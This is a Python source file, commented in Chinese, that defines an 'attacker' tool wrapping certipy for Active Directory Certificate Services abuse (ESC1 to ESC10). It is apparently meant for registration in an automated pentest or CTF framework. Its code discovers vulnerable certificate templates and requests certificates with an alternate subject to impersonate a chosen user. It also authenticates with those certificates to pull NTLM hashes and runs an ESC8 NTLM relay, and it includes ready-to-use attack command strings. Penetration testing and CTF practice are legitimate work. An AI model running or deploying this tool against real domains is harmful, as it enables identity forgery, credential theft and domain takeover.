# tools/adcs_abuse_tool.py
"""
AD CS (Active Directory Certificate Services) 滥用工具

支持的攻击向量：
1. ESC1 - 滥用证书模板（可指定SAN）
2. ESC2 - 滥用证书模板（Any Purpose）
3. ESC3 - 滥用证书请求代理
4. ESC4 - 滥用证书模板ACL
5. ESC5 - 滥用PKI对象ACL
6. ESC6 - 滥用EDITF_ATTRIBUTESUBJECTALTNAME2
7. ESC7 - 滥用证书颁发机构
8. ESC8 - AD CS HTTP端点NTLM Relay
9. ESC9 - 滥用NoSecurityExtension
10. ESC10 - 滥用弱证书映射

CTF场景优化:
- 自动发现漏洞模板
- 一键请求恶意证书
- 证书认证获取凭据

集成：
- app.logger
- tool_framework
"""

from typing import Dict, Any, Optional, List
import subprocess
import os
import re

from tool_framework import CommandLineTool

# 集成日志
try:
    from app.logger import get_logger
except ImportError:
    from logger import get_logger

logger = get_logger("ADCSAbuse")


class ESCType:
    """ESC攻击类型"""
    ESC1 = "esc1"
    ESC2 = "esc2"
    ESC3 = "esc3"
    ESC4 = "esc4"
    ESC5 = "esc5"
    ESC6 = "esc6"
    ESC7 = "esc7"
    ESC8 = "esc8"
    ESC9 = "esc9"
    ESC10 = "esc10"


class ADCSAbuseTool(CommandLineTool):
    """AD CS滥用工具"""

    # 前置条件声明
    REQUIRES_CREDENTIALS = True
    REQUIRES_SHELL_SESSION = False
    TOOL_CATEGORY = "attacker"
    REQUIRES_OS = "any"

    def __init__(self):
        self.timeout = 300
        super().__init__("certipy")

    def name(self) -> str:
        return "adcs-abuse"

    def description(self) -> str:
        return "AD CS滥用工具，支持ESC1-10证书模板攻击，可获取任意用户凭据"

    def supported_vulns(self) -> list:
        return ["AD CS", "ESC1", "ESC2", "ESC3", "ESC4", "ESC8", "Certificate Abuse", "PKI"]

    def capability_statement(self) -> str:
        return "AD CS证书滥用工具。需要域凭据。支持ESC1-10多种攻击向量。可发现漏洞模板、请求恶意证书、认证获取凭据。适合：域环境提权、域控攻击。"

    def check_available(self) -> bool:
        # 检查certipy（pipx安装，使用shutil.which检测）
        import shutil
        return shutil.which("certipy") is not None

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "action": {
                "type": "str",
                "description": "操作: find/request/auth/relay",
                "required": True
            },
            "domain": {
                "type": "str",
                "description": "域名",
                "required": True
            },
            "dc_ip": {
                "type": "str",
                "description": "域控IP",
                "required": True
            },
            "username": {
                "type": "str",
                "description": "用户名",
                "required": True
            },
            "password": {
                "type": "str",
                "description": "密码",
                "required": True
            },
            "ca": {
                "type": "str",
                "description": "证书颁发机构名称（如：CA-SERVER-CA）",
                "required": False
            },
            "template": {
                "type": "str",
                "description": "证书模板名称",
                "required": False
            },
            "target_user": {
                "type": "str",
                "description": "目标用户（ESC1攻击）",
                "required": False
            },
            "pfx_path": {
                "type": "str",
                "description": "PFX证书路径",
                "required": False
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        """执行AD CS操作"""
        action = params.get("action", "find")

        action_map = {
            "find": self._find_vulnerabilities,
            "request": self._request_certificate,
            "auth": self._authenticate_with_cert,
            "relay": self._ntlm_relay
        }

        handler = action_map.get(action)
        if not handler:
            return {"error": f"不支持的操作: {action}", "success": False}

        return handler(params)

    def _find_vulnerabilities(self, params: Dict) -> Dict:
        """发现AD CS漏洞"""
        results = {
            "success": True,
            "vulnerable_templates": [],
            "ca_info": {}
        }

        domain = params.get("domain", "")
        dc_ip = params.get("dc_ip", "")
        username = params.get("username", "")
        password = params.get("password", "")

        if not all([domain, username, password]):
            return {"error": "缺少必要参数", "success": False}

        logger.info(f"[ADCS] 扫描AD CS漏洞: {domain}")

        try:
            cmd = [
                "certipy", "find",
                "-u", f"{username}@{domain}",
                "-p", password,
                "-dc-ip", dc_ip,
                "-text-only"
            ]

            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=self.timeout
            )

            if result.returncode == 0:
                output = result.stdout
                results["raw_output"] = output

                # 解析ESC漏洞
                esc_patterns = {
                    ESCType.ESC1: r"ESC1.*?template[:\s]+(\S+)",
                    ESCType.ESC2: r"ESC2.*?template[:\s]+(\S+)",
                    ESCType.ESC3: r"ESC3.*?template[:\s]+(\S+)",
                    ESCType.ESC4: r"ESC4.*?template[:\s]+(\S+)",
                }

                for esc_type, pattern in esc_patterns.items():
                    matches = re.findall(pattern, output, re.IGNORECASE | re.DOTALL)
                    for match in matches:
                        results["vulnerable_templates"].append({
                            "esc_type": esc_type,
                            "template": match
                        })

                ca_match = re.search(r"CA Name[:\s]+(\S+)", output)
                if ca_match:
                    results["ca_info"]["name"] = ca_match.group(1)

                logger.info(f"[ADCS] 发现 {len(results['vulnerable_templates'])} 个漏洞模板")
            else:
                results["success"] = False
                results["error"] = result.stderr

        except FileNotFoundError:
            results["success"] = False
            results["error"] = "certipy不可用，请安装: pip install certipy"
        except Exception as e:
            results["success"] = False
            results["error"] = str(e)

        return results

    def _request_certificate(self, params: Dict) -> Dict:
        """请求恶意证书"""
        results = {"success": True, "certificate": None}

        domain = params.get("domain", "")
        dc_ip = params.get("dc_ip", "")
        username = params.get("username", "")
        password = params.get("password", "")
        ca = params.get("ca", "")
        template = params.get("template", "")
        target_user = params.get("target_user", "")

        if not all([domain, username, password, ca, template]):
            return {"error": "缺少必要参数", "success": False}

        logger.info(f"[ADCS] 请求证书: {template} -> {target_user or username}")

        try:
            cmd = [
                "certipy", "req",
                "-u", f"{username}@{domain}",
                "-p", password,
                "-dc-ip", dc_ip,
                "-ca", ca,
                "-template", template
            ]

            if target_user:
                cmd.extend(["-alt", target_user])

            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=self.timeout
            )

            if result.returncode == 0:
                output = result.stdout
                results["output"] = output

                pfx_match = re.search(r"saved to (\S+\.pfx)", output)
                if pfx_match:
                    results["certificate"] = pfx_match.group(1)

                logger.info(f"[ADCS] 证书请求成功")
            else:
                results["success"] = False
                results["error"] = result.stderr

        except Exception as e:
            results["success"] = False
            results["error"] = str(e)

        return results

    def _authenticate_with_cert(self, params: Dict) -> Dict:
        """使用证书进行认证"""
        results = {"success": True, "credentials": {}}

        domain = params.get("domain", "")
        dc_ip = params.get("dc_ip", "")
        pfx_path = params.get("pfx_path", "")

        if not all([domain, dc_ip, pfx_path]):
            return {"error": "缺少必要参数", "success": False}

        logger.info(f"[ADCS] 使用证书认证: {pfx_path}")

        try:
            cmd = [
                "certipy", "auth",
                "-pfx", pfx_path,
                "-dc-ip", dc_ip
            ]

            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=self.timeout
            )

            if result.returncode == 0:
                output = result.stdout
                results["output"] = output

                ntlm_match = re.search(r"NTLM[:\s]+([a-f0-9]{32})", output, re.IGNORECASE)
                if ntlm_match:
                    results["credentials"]["ntlm_hash"] = ntlm_match.group(1)

                user_match = re.search(r"Username[:\s]+(\S+)", output)
                if user_match:
                    results["credentials"]["username"] = user_match.group(1)

                logger.info(f"[ADCS] 认证成功")
            else:
                results["success"] = False
                results["error"] = result.stderr

        except Exception as e:
            results["success"] = False
            results["error"] = str(e)

        return results

    def _ntlm_relay(self, params: Dict) -> Dict:
        """ESC8 - NTLM Relay攻击"""
        results = {"success": True}

        target_ca = params.get("ca", "")
        listener_port = params.get("listener_port", "445")

        if not target_ca:
            return {"error": "需要提供目标CA地址", "success": False}

        logger.info(f"[ADCS] ESC8 NTLM Relay: {target_ca}")

        try:
            cmd = [
                "certipy", "relay",
                "-ca", target_ca,
                "-port", listener_port
            ]

            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=self.timeout
            )

            if result.returncode == 0:
                output = result.stdout
                results["output"] = output

                if ".pfx" in output:
                    results["relay_success"] = True
                    pfx_match = re.search(r"(\S+\.pfx)", output)
                    if pfx_match:
                        results["certificate"] = pfx_match.group(1)
            else:
                results["success"] = False
                results["error"] = result.stderr

        except Exception as e:
            results["success"] = False
            results["error"] = str(e)

        return results

    def get_esc_attack_guide(self, esc_type: str) -> Dict:
        """获取ESC攻击指南"""
        guides = {
            ESCType.ESC1: {
                "name": "滥用证书模板（可指定SAN）",
                "description": "模板允许指定subjectAltName，可伪造任意用户身份",
                "command": "certipy req -u user@domain -p pass -ca CA_NAME -template TEMPLATE -alt TARGET_USER"
            },
            ESCType.ESC8: {
                "name": "AD CS HTTP NTLM Relay",
                "description": "AD CS Web端点易受NTLM Relay攻击",
                "command": "certipy relay -ca CA_SERVER"
            }
        }

        return guides.get(esc_type, {"error": "未知的ESC类型"})


# 全局实例
_adcs_abuse_tool = None


def get_adcs_abuse_tool() -> ADCSAbuseTool:
    global _adcs_abuse_tool
    if _adcs_abuse_tool is None:
        _adcs_abuse_tool = ADCSAbuseTool()
    return _adcs_abuse_tool


def register():
    from tool_framework import ToolRegistry
    ToolRegistry.register(ADCSAbuseTool())